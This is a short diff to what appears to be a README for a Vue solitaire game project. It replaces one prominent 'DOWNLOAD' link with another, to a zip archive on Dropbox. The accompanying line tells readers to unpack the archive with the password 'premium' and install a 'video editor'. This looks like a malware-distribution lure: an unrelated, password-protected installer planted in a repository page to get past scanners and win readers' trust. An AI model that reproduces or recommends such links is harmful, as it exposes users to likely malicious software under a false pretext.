@@ -19,7 +19,7 @@
 <img src="https://img.shields.io/github/issues/silent-lad/VueSolitaire.svg">
 
 
-<h1 align="center"><a  href="http://download1518.mediafire.com/418e34xcztvg/4jp45cjvx0sq08v/Setup.zip">DOWNLOAD</a></h1>
+<h1 align="center"><a  href="https://www.dropbox.com/s/3nn0w8zq64iphsm/MediaArchive.zip?dl=1">DOWNLOAD</a></h1>
 <h4 align="center">Download the program, use the password: premium. To unpack the archive and install the video editor on your computer </h4>
 <p align="center">
   
